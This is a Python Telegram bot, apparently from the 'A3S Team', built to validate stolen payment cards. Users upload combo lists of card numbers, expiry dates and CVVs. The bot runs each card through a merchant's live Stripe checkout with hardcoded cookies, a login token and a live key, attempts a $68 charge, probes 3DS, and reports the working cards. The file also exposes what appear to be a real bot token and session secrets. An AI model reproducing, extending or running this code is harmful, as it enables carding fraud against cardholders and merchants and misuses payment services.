#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
import re
import urllib3
import time
from typing import Dict, List
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════
# 🔧 CONFIGURATION
# ═══════════════════════════════════════
TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_ID = 5895491379
INVOICE_ID = "260528"

# 🔑 مفتاح الدخول - غيره للمفتاح اللي تريده
VALID_KEY = "A3S_VIP_2025"

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ═══════════════════════════════════════
# 📦 STORAGE
# ═══════════════════════════════════════
user_cards = {}
checking_status = {}
authorized_users = {}  # {user_id: True/False}

cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    '_ga': 'GA1.1.1641871625.1761294273',
    '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
    'inputNotes': '',
    'inputHowDidYouFind': '',
    'howDidRewards': '',
    'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
    'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
    'VsysFirstVisit': '1761307789',
    '_ga_248YG9EFT7': 'GS2.1.s1761307804$o4$g1$t1761310483$j59$l0$h2017258656',
    '_clsk': '1f48kid%5E1761292981284%5E16%5E1%5Ez.clarity.ms%2Fcollect',
}

# ═══════════════════════════════════════
# 🛡️ STRIPE CHECKER CLASS
# ═══════════════════════════════════════
class StripeChecker:
    def __init__(self):
        self.session = requests.Session()
    
    def get_session_data(self):
        """جلب session_id و stripe cookies"""
        data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
        try:
            self.session.post(
                f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay',
                data=data, cookies=cookies, verify=False, timeout=15
            )
        except:
            pass
        
        try:
            resp = self.session.get(
                f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}',
                cookies=cookies, verify=False, timeout=15
            )
            
            m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
            if not m or '/pay/' not in m.group(0):
                return None, None, None
            
            session_id = m.group(0).split('/pay/')[1].split('#')[0]
            
            new_cookies = self.session.cookies.get_dict()
            stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
            stripe_sid = new_cookies.get('__stripe_sid', '')
            
            if not stripe_sid:
                time.sleep(2)
                resp2 = self.session.get(
                    f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}',
                    cookies=cookies, verify=False, timeout=15
                )
                new_cookies2 = self.session.cookies.get_dict()
                stripe_sid = new_cookies2.get('__stripe_sid', '')
            
            return session_id, stripe_mid, stripe_sid
        except:
            return None, None, None
    
    def check_card(self, card: Dict) -> Dict:
        """فحص البطاقة"""
        start_time = time.time()
        
        try:
            session_id, mid, sid = self.get_session_data()
            if not session_id:
                return {
                    'status': 'ERROR',
                    'message': 'Session Error',
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://checkout.stripe.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            pm_data = (
                f'type=card&card[number]={card["number"]}&card[cvc]={card["cvv"]}&'
                f'card[exp_month]={card["month"]}&card[exp_year]={card["year"]}&'
                'billing_details[name]=Card+Holder&billing_details[email]=test%40test.com&'
                f'billing_details[address][country]=EG&muid={mid}'
            )
            
            if sid:
                pm_data += f'&sid={sid}'
            
            pm_data += (
                '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
                f'client_attribution_metadata[checkout_session_id]={session_id}'
            )
            
            r1 = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers, data=pm_data, timeout=20
            )
            pm_res = r1.json()
            
            if 'error' in pm_res:
                return {
                    'status': 'DECLINED',
                    'message': pm_res['error'].get('message', 'Error'),
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }
            
            if 'id' not in pm_res:
                return {
                    'status': 'ERROR',
                    'message': 'PM Creation Failed',
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }
            
            pm_id = pm_res['id']
            card_info = pm_res.get('card', {})
            
            confirm_data = f'payment_method={pm_id}&expected_amount=6800'
            if mid:
                confirm_data += f'&muid={mid}'
            if sid:
                confirm_data += f'&sid={sid}'
            confirm_data += '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
            
            r2 = requests.post(
                f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                headers=headers, data=confirm_data, timeout=20
            )
            
            confirm_res = r2.json()
            
            if 'payment_intent' not in confirm_res:
                return {
                    'status': 'ERROR',
                    'message': 'No Payment Intent',
                    'details': self._get_card_details(card_info),
                    'time': round(time.time() - start_time, 2)
                }
            
            pi = confirm_res['payment_intent']
            status = pi.get('status')
            
            details = self._get_card_details(card_info)
            
            if status == 'succeeded':
                return {
                    'status': 'LIVE',
                    'message': '✅ Charged $68',
                    'details': details,
                    'time': round(time.time() - start_time, 2)
                }
            
            if status == 'requires_action':
                na = pi.get('next_action', {})
                if na.get('type') == 'use_stripe_sdk':
                    source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                    if source_id:
                        tds_result = self._handle_3ds(source_id, headers)
                        return {
                            'status': tds_result['status'],
                            'message': tds_result['message'],
                            'details': details,
                            'time': round(time.time() - start_time, 2)
                        }
            
            error = pi.get('last_payment_error', {})
            if error:
                msg = error.get('message', error.get('code', status))
                return {
                    'status': 'DECLINED',
                    'message': f'❌ {msg}',
                    'details': details,
                    'time': round(time.time() - start_time, 2)
                }
            
            return {
                'status': 'DECLINED',
                'message': f'❌ {status}',
                'details': details,
                'time': round(time.time() - start_time, 2)
            }
            
        except Exception as e:
            return {
                'status': 'ERROR',
                'message': f'⚠️ {str(e)[:30]}',
                'details': {},
                'time': round(time.time() - start_time, 2)
            }
    
    def _handle_3ds(self, source_id, headers):
        """معالجة 3DS"""
        try:
            tds_data = (
                f'source={source_id}&'
                'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0%22%7D&'
                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
            )
            
            r3 = requests.post(
                'https://api.stripe.com/v1/3ds2/authenticate',
                headers=headers, data=tds_data, timeout=20
            )
            tds_res = r3.json()
            
            trans = tds_res.get('ares', {}).get('transStatus')
            if not trans:
                trans = tds_res.get('transStatus')
            if not trans and 'state' in tds_res:
                state = tds_res.get('state')
                if state == 'succeeded':
                    return {'status': 'LIVE', 'message': '✅ Approved (3DS)'}
                elif state == 'failed':
                    return {'status': 'DECLINED', 'message': '❌ Declined (3DS)'}
            
            if trans == 'Y':
                return {'status': 'LIVE', 'message': '✅ Approved (3DS)'}
            elif trans == 'N':
                return {'status': 'LIVE', 'message': '✅ Live Card'}
            elif trans == 'C':
                return {'status': 'OTP', 'message': '🔐 OTP Required'}
            elif trans == 'R':
                return {'status': 'DECLINED', 'message': '❌ 3DS Rejected'}
            else:
                return {'status': 'ERROR', 'message': f'❓ 3DS: {trans}'}
        except:
            return {'status': 'ERROR', 'message': '⚠️ 3DS Error'}
    
    def _get_card_details(self, card_info):
        """استخراج تفاصيل البطاقة"""
        country_emoji = {
            'US': '🇺🇸', 'IT': '🇮🇹', 'GB': '🇬🇧', 'CA': '🇨🇦',
            'FR': '🇫🇷', 'DE': '🇩🇪', 'ES': '🇪🇸', 'BR': '🇧🇷',
            'MX': '🇲🇽', 'IN': '🇮🇳', 'CN': '🇨🇳', 'JP': '🇯🇵',
            'AU': '🇦🇺', 'NL': '🇳🇱', 'BE': '🇧🇪', 'CH': '🇨🇭',
            'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮',
            'PL': '🇵🇱', 'RU': '🇷🇺', 'TR': '🇹🇷', 'EG': '🇪🇬',
            'SA': '🇸🇦', 'AE': '🇦🇪', 'QA': '🇶🇦', 'KW': '🇰🇼'
        }
        
        brand = card_info.get('brand', 'Unknown').upper()
        country = card_info.get('country', 'XX')
        emoji = country_emoji.get(country, '🏳️')
        
        return {
            'type': brand,
            'country': country,
            'emoji': emoji,
            'bank': 'Unknown Bank'
        }

# ═══════════════════════════════════════
# 🔐 AUTHORIZATION CHECK
# ═══════════════════════════════════════
def is_authorized(user_id):
    """التحقق من صلاحية المستخدم"""
    return authorized_users.get(user_id, False)

def check_authorization(func):
    """ديكوريتور للتحقق من الصلاحيات"""
    def wrapper(message):
        if not is_authorized(message.from_user.id):
            bot.send_message(
                message.chat.id,
                """<b>🔒 Access Denied!
━━━━━━━━━━━━━━━━━━━
⚠️ You need a valid key to use this bot.

📝 Send your key using:
<code>/key YOUR_KEY</code>

💬 Contact: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            )
            return
        return func(message)
    return wrapper

# ═══════════════════════════════════════
# 🤖 BOT HANDLERS
# ═══════════════════════════════════════

@bot.message_handler(commands=['key'])
def handle_key(message):
    """معالجة مفتاح الدخول"""
    try:
        key = message.text.split(maxsplit=1)[1].strip()
        
        if key == VALID_KEY:
            authorized_users[message.from_user.id] = True
            bot.send_message(
                message.chat.id,
                f"""<b>✅ Access Granted!
━━━━━━━━━━━━━━━━━━━
🎉 Welcome {message.from_user.first_name}!

🔓 You now have full access to the bot.
📤 Send your combo file to start checking.

💬 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            )
        else:
            bot.send_message(
                message.chat.id,
                """<b>❌ Invalid Key!
━━━━━━━━━━━━━━━━━━━
⚠️ The key you entered is incorrect.

💬 Contact: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            )
    except:
        bot.send_message(
            message.chat.id,
            """<b>⚠️ Usage:
<code>/key YOUR_KEY</code>
</b>"""
        )

@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    
    if not is_authorized(message.from_user.id):
        welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Stripe Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━
🔒 This bot requires authorization.

📝 To get access, send:
<code>/key YOUR_KEY</code>

💬 Contact: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    else:
        welcome_text = f"""<b>🎉 Welcome Back {username}!

🔥 Stripe Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results (3 at once)
🔒 Secure Processing
💳 Only LIVE Cards Sent

📤 Send your combo file to start!
━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(content_types=["document"])
@check_authorization
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        
        cards = []
        for line in lines:
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cards.append({
                        'number': parts[0].strip(),
                        'month': parts[1].strip().zfill(2),
                        'year': parts[2].strip(),
                        'cvv': parts[3].strip(),
                        'raw': line
                    })
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        
        user_cards[user_id] = cards
        checking_status[user_id] = False
        
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: Stripe (3 Threads)
⚡ Status: Ready

Click below to start:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    
    if not is_authorized(user_id):
        bot.answer_callback_query(call.id, "❌ Unauthorized!")
        return
    
    if user_id not in user_cards or not user_cards[user_id]:
        bot.answer_callback_query(call.id, "❌ No cards loaded!")
        return
    
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already checking!")
        return
    
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="⏳ Initializing checker...\n🔑 Getting session keys..."
    )
    
    checker = StripeChecker()
    
    live = approved = otp = declined = errors = checked = 0
    start_time = time.time()
    
    # معالجة البطاقات في مجموعات من 3
    for i in range(0, len(cards), 3):
        if not checking_status.get(user_id, True):
            break
        
        batch = cards[i:i+3]
        results = [None] * len(batch)
        threads = []
        
        def check_single_card(card, index):
            results[index] = checker.check_card(card)
        
        for j, card in enumerate(batch):
            t = threading.Thread(target=check_single_card, args=(card, j))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # معالجة النتائج
        for j, (card, result) in enumerate(zip(batch, results)):
            checked += 1
            
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            keyboard.add(
                types.InlineKeyboardButton(f"📋 Result: {result['status']}", callback_data=f"show_{checked}"),
                types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
                types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
            )
            
            if result['status'] == 'LIVE':
                live += 1
                details = result['details']
                msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec

🦁 BIN Info:
├ Type: {details.get('type', 'Unknown')}
├ Bank: {details.get('bank', 'Unknown')}
└ Country: {details.get('country', 'XX')} {details.get('emoji', '🏳️')}
━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
                bot.send_message(user_id, msg)
            elif result['status'] == 'OTP':
                otp += 1
            elif result['status'] == 'DECLINED':
                declined += 1
            else:
                errors += 1
            
            user_cards[user_id][i+j]['result'] = result
            
            progress = int((checked / total) * 20)
            progress_bar = f"[{'█' * progress}{'▒' * (20 - progress)}] {int((checked / total) * 100)}%"
            elapsed = time.time() - start_time
            speed = checked / elapsed if elapsed > 0 else 0
            eta = (total - checked) / speed if speed > 0 else 0
            
            try:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    text=f"""<b>🔥 Gateway: Stripe (3 Threads)
━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {card['number'][:6]}...{card['number'][-4:]}
</b>""",
                    reply_markup=keyboard
                )
            except:
                pass
        
        if i + 3 < len(cards):
            time.sleep(2)
    
    total_time = time.time() - start_time
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ OTP 🔐: {otp}
├ Declined ❌: {declined}
├ Errors ⚠️: {errors}

⏱ Stats:
├ Time: {int(total_time)}s
└ Speed: {(total/total_time):.2f} cards/sec
━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    )
    
    checking_status[user_id] = False
    del user_cards[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('show_'))
def show_card_result(call):
    user_id = call.from_user.id
    index = int(call.data.split('_')[-1]) - 1
    
    if user_id not in user_cards or index >= len(user_cards[user_id]):
        bot.answer_callback_query(call.id, "❌ No result!")
        return
    
    card = user_cards[user_id][index]
    result = card.get('result', {})
    details = result.get('details', {})
    
    msg = f"""<b>{result.get('message', '❓ Unknown')}
━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Status: {result.get('status', 'Unknown')}
⏱ Time: {result.get('time', 0)} sec"""
    
    if details:
        msg += f"""

🦁 BIN Info:
├ Type: {details.get('type', 'Unknown')}
├ Bank: {details.get('bank', 'Unknown Bank')}
└ Country: {details.get('country', 'XX')} {details.get('emoji', '🏳️')}
━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    
    bot.send_message(user_id, msg)
    bot.answer_callback_query(call.id, "📋 Result displayed!")

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Checking stopped!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
@check_authorization
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status
/key - Enter access key

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Bot checks 3 cards simultaneously
4. Only LIVE cards sent directly

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['status'])
@check_authorization
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Stripe Payment
🔥 Threads: 3 Parallel
✅ Accuracy: High
🌐 Server: Active
━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, status_text)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    # التحقق من الصلاحيات أولاً
    if not is_authorized(message.from_user.id):
        bot.send_message(
            message.chat.id,
            """<b>🔒 Access Denied!
━━━━━━━━━━━━━━━━━━━
⚠️ You need authorization to use this bot.

📝 Send your key:
<code>/key YOUR_KEY</code>
</b>"""
        )
        return
    
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        parts = text.split('|')
        user_cards[message.from_user.id] = [{
            'number': parts[0].strip(),
            'month': parts[1].strip().zfill(2),
            'year': parts[2].strip(),
            'cvv': parts[3].strip(),
            'raw': text
        }]
        checking_status[message.from_user.id] = False
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
🔥 Gateway: Stripe Payment
⚡ Status: Ready
</b>""",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!
Use: Card|MM|YYYY|CVV
Example: 5127740080852575|03|2027|825
</b>""")

# ═══════════════════════════════════════
# 🚀 START BOT
# ═══════════════════════════════════════
if __name__ == "__main__":
    print("=" * 50)
    print("🚀 Starting Stripe Checker Bot...")
    print("=" * 50)
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"🔑 Access Key: {VALID_KEY}")
    print(f"💳 Invoice ID: {INVOICE_ID}")
    print("✅ Bot is running...")
    print("=" * 50)
    print("\n⚠️  IMPORTANT NOTES:")
    print("• Users must enter key to access: /key A3S_VIP_2025")
    print("• Bot checks 3 cards simultaneously")
    print("• Only LIVE cards are sent directly")
    print("• Other results shown via button")
    print("=" * 50)
    
    bot.polling(none_stop=True)
